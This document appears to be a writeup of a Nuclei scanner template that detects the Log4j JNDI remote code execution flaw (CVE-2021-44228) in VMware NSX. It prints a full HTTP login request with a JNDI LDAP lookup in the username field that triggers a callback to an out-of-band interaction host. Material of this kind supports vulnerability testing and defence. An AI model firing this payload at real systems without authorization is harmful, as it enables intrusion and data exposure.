# Nuclei Template: VMware NSX - Remote Code Execution (Apache Log4j)
**Template ID:** vmware-nsx-log4j-rce
**Vulnerability Class:** Command Injection - Generic
**Severity:** Critical
**CWE:** CWE-77
**Source:** Nuclei Template (`vmware-nsx-log4j-rce.yaml`)

## Vulnerability Information & PoC

## Description
VMware NSX is susceptible to remote code execution via the Apache Log4j framework. An attacker can execute malware, obtain sensitive information, modify data, and/or gain full control over a compromised system without entering necessary credentials.

## Steps to reproduce / Exploit Payload
```http
@timeout: 20s
POST /login HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded
Origin: {{BaseURL}}
Referer: {{BaseURL}}/login.jsp

username=${jndi:ldap://${:-{{rand1}}}${:-{{rand2}}}.${hostName}.username.{{interactsh-url}}}&password=admin&submit=
```

## References
- https://kb.vmware.com/s/article/87086
- https://logging.apache.org/log4j/2.x/security.html
- https://nvd.nist.gov/vuln/detail/CVE-2021-44228
